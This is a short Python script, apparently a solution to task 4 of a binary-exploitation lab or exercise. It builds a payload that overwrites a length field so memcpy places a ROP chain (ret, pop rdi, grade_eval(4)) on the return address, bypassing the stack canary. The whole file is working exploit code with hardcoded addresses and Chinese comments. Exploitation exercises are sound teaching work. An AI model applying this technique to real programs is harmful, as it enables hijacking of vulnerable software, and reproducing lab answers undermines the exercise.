#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (canary bypass)."""
import struct
import sys


def qword(value):
    return struct.pack("<Q", value)


# 关键地址（非 PIE，每次运行固定）
RET = 0x401526          # 单独的 ret：16 字节栈对齐滑板
POP_RDI = 0x4018a3      # pop rdi; ret（藏在 pop r15 的 41 5f c3 内部）
GRADE_EVAL = 0x401677   # grade_eval 函数入口

# input 栈帧布局（相对 rbp）
#   rbp-0x120  expression[128]
#   rbp-0x0a0  logMsg[128]
#   rbp-0x020  len (int)
#   rbp-0x008  canary
#   rbp+0x008  返回地址
# 令 memcpy 目标 logMsg + len 恰好等于 rbp+8  =>  len = 0xa8
LEN = 0xa8

# 前 128 字节：memcpy 后被原样搬到 rbp+8，即 ROP 链
chain  = qword(RET)                    # 对齐滑板
chain += qword(POP_RDI)                # pop rdi; ret
chain += qword(4)                      # rdi = 4
chain += qword(GRADE_EVAL)             # grade_eval(4)
chain += b"\x00" * (128 - len(chain))  # 链剩余部分填 0

# 128 字节 logMsg 区域：内容无所谓，只为到达 len 字段
middle = b"\x00" * 128

# 覆盖 len，控制 memcpy 目标
len_field = struct.pack("<I", LEN)

payload = chain + middle + len_field

sys.stdout.buffer.write(payload)
